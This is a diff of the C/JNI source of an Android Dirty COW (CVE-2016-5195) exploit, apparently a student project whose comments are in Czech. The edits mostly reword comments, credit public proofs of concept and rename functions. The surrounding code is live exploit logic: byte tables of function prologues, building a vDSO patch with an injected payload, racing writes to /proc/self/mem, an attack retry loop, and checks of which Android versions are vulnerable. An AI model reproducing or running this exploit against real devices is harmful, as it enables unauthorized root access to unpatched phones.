@@ -1,20 +1,10 @@
 /*
- * Zdroje:
-
- *  Tato prace je zalozena zejmena na:
-
-    - proof-of-concept utoku na Dirty Cow pomoci vDSO uzivatele GitHubu scumjr
-        (https://github.com/scumjr/dirtycow-vdso)
-
-    - proof-of-concept utoku na Dirty Cow v Androidu uzivatele GitHubu timwr
-        (https://github.com/timwr/CVE-2016-5195)
-
-    - parseru ELF binarnich souboru uzivatele GitHubu eklitzke
-        (https://github.com/eklitzke/parse-elf)
-
- *  Funkce oznacene jmeny techto autoru jsou jimi vice ci mene inspirovany.
- *  Pokud se jedna o jiny zdroj, je odkaz primo u funkce.
-
+ * Autor: Vit Soucek (soucevi1@fit.cvut.cz)
+ * Hlavni zdroje:
+    - proof-of-concept utoku na Dirty Cow pomoci vDSO uzivatele GitHubu scumjr (https://github.com/scumjr/dirtycow-vdso)
+    - proof-of-concept utoku na Dirty Cow v Androidu uzivatele GitHubu timwr (https://github.com/timwr/CVE-2016-5195)
+ *  Kod prevzaty z techto projektu je oznacem pouze jmenem autora.
+ *  Pokud je cast kodu prevzata z jineho zdroje, je odkaz primo u daneho mista.
  */
 
 #ifndef _GNU_SOURCE
@@ -92,16 +82,16 @@ static struct prologue prologues[] = {
         {(char *) "\x55\x83\xff\x01\x48\x89\xe5", 7},
 
         // Nove 32bitove prology
-        /* push ebp; mov ebp, esp; push edi; push esi; push ebx === Android x86 4.4-r4, 5.1, 6.0*/
+        /* push ebp; mov ebp, esp; push edi; push esi; push ebx */
         {(char *) "\x55\x89\xe5\x57\x56\x53",     6},
 
         // Nove 64bitove prology
-        /* push rbp; push r13; push r12; push rbx; sub 0x10, rsp === Android 7.0 64bit */
+        /* push rbp; push r13; push r12; push rbx; sub 0x10, rsp */
         {(char*) "\x55\x41\x55\x41\x54\x53\x48\x83\xec\x10", 10},
-        /* push rbp; push r14; push r13; push r12; push rbx; mov edi, ebx === Android 7.0 64bit */
+        /* push rbp; push r14; push r13; push r12; push rbx; mov edi, ebx */
         {(char*) "\x55\x41\x56\x41\x55\x41\x54\x53\x89\xfb", 10},
         {(char*) "\x55\x41\x56\x41\x55\x41\x54\x53\x48\x89\xfb", 11},
-        /* push rbp; mov rbp, rsp; push r13; push r12; push rbx  === Android 5.0 64bit, Android 6.0-r2 64bit */
+        /* push rbp; mov rbp, rsp; push r13; push r12; push rbx */
         {(char*) "\x55\x48\x89\xe5\x41\x55\x41\x54\x53", 9},
 };
 
@@ -129,7 +119,9 @@ struct mem_arg {
 
 //==================================================================================================
 // Ziskani velikosti VDSO
-//      zdroj: https://gist.github.com/scumjr/17d91f20f73157c722ba2aea702985d2
+//      zdroj: Utok na libc uzivatele GitHubu scumjr
+//             (https://gist.github.com/scumjr/17d91f20f73157c722ba2aea702985d2),
+//             upraveno pro hledani velikosti vDSO (misto adresniho rozsahu libc)
 //==================================================================================================
 unsigned int get_vDSO_size()
 {
@@ -256,8 +248,8 @@ struct prologue *get_prologue_from_db(unsigned long clock_gettime_address) {
 }
 
 //==================================================================================================
-// Zisani prologu primo z pameti.
-//      - pro architektury s pevnou delkou instrukce (zde 8 B)
+// Ziskani prologu primo z pameti.
+//      - pro architektury s pevnou delkou instrukce
 //      - prolog jsou zde vzdy 2 instrukce
 //==================================================================================================
 struct prologue * get_prologue_from_memory(unsigned long clock_gettime_address){
@@ -277,7 +269,7 @@ struct prologue * get_prologue_from_memory(unsigned long clock_gettime_address){
 
 //==================================================================================================
 // Vlozeni prologu vDSO dovnitr do payloadu
-//      zdroj: scumjr
+//      zdroj: scumjr, upraveno pro podporu vice architektur
 //==================================================================================================
 int patch_payload(struct prologue *prol, unsigned char *payload, unsigned int payload_length,
                   AndroidCpuFamily cpu_family) {
@@ -366,7 +358,9 @@ unsigned long get_empty_space_offset(void *vDSO_address) {
 
 //==================================================================================================
 // Sestaveni zaplaty vDSO
-//      zdroj: scumjr
+//      zdroj: scumjr, pro ARM verzi projekt VIKIROOT uzivatele GitHubu hyln9
+//             (https://github.com/hyln9/VIKIROOT/blob/master/exploit.c),
+//             upraveno pro podporu vice architektur
 //==================================================================================================
 int build_vDSO_patch(unsigned long vdso_address, unsigned long gettime_address, prologue *p,
                      unsigned char *payload, unsigned int payload_length,
@@ -457,7 +451,7 @@ void* check_thread(void *arg) {
 
 //==================================================================================================
 // Funkce zapisujici do /proc/self/mem
-//      zdroj: timwr
+//      zdroj: timwr, upraveno
 //==================================================================================================
 void *writing_thread(void *arg) {
     struct mem_arg *mem_arg;
@@ -515,9 +509,9 @@ bool check(mem_arg *arg) {
 
 //==================================================================================================
 // Funkce iniciujici utok pres /proc/self/mem
-//      zdroj: scumjr
+//      zdroj: scumjr, upraveno pro utok pres /proc/self/mem misto ptrace
 //==================================================================================================
-int patchVDSO(struct mem_arg *arg) {
+int patch_vDSO(struct mem_arg *arg) {
     int status, ret;
     pthread_t pth1, pth2;
 
@@ -564,7 +558,7 @@ int patchVDSO(struct mem_arg *arg) {
 
 //==================================================================================================
 // Funkce iniciujici utok na Dirty CoW
-//    zdroj: timwr
+//    zdroj: timwr, upraveno pro vice pokusu na utok, pridana kontrola
 //==================================================================================================
 int exploit(struct mem_arg *arg) {
     int exit = 3;
@@ -576,7 +570,7 @@ int exploit(struct mem_arg *arg) {
 
         // 3 pokusy na kazdy utok
         for(int j = 0; j < 3; j++){
-            patchVDSO(arg);
+            patch_vDSO(arg);
             if (check(arg)) {
                 LOG("        Attack #%d successful", i);
                 break;
@@ -593,7 +587,8 @@ int exploit(struct mem_arg *arg) {
 
 //==================================================================================================
 // Konverze Java String -> std::string
-//      zdroj: https://stackoverflow.com/a/11559207/6136143
+//      zdroj: Odpoved uzivatele Sergey K. na StackOverflow
+//             (https://stackoverflow.com/a/11559207/6136143)
 //==================================================================================================
 string ConvertJString(JNIEnv *env, jstring str) {
     if (!str) {
@@ -632,10 +627,11 @@ string get_file_path(JNIEnv *env, jstring filePath){
 }
 
 //==================================================================================================
-// Funkce, ktera zvoli veci zavisle na architekture -- payload, ofset clock_gettime
+// Funkce, ktera zvoli aspekty zavisle na architekture -- payload, ofset clock_gettime
 //==================================================================================================
-int solve_architecture(unsigned long vDSO_address, unsigned long *clock_gettime_offset,
-                       unsigned char **payload, unsigned int *payload_len, AndroidCpuFamily *family){
+int resolve_architecture(unsigned long vDSO_address, unsigned long *clock_gettime_offset,
+                         unsigned char **payload, unsigned int *payload_len,
+                         AndroidCpuFamily *family){
     *family = android_getCpuFamily();
 
     switch(*family){
@@ -728,7 +724,7 @@ int check_sdk_version(int sdk_version){
         LOG("    SDK: %d, Android 7.0", sdk_version);
             return 0;
         default:
-            // Android 7.1 vysel az po opraveni Dirty Dow
+            // Android 7.1 vysel az po opraveni Dirty Cow
         LOG("    SDK version not supported (%d) - either too new (Android 7.1 and newer are resistant against Dirty CoW) or non-existent",
             sdk_version);
             return -1;
@@ -767,8 +763,9 @@ Java_com_bp_dirtycow_MainActivity_dirtyCow(JNIEnv *env, jobject callingObject,
 
     get_vDSO_size();
 
-    LOG("* Assigning architecture specific stuff");
-    if(solve_architecture(vDSO_address, &clock_gettime_offset, &payload, &payload_length, &cpu_family) == -1){
+    LOG("* Assigning architecture specific aspects");
+    if(resolve_architecture(vDSO_address, &clock_gettime_offset, &payload, &payload_length,
+                            &cpu_family) == -1){
         LOG("    Error while assigning");
         return -1;
     }
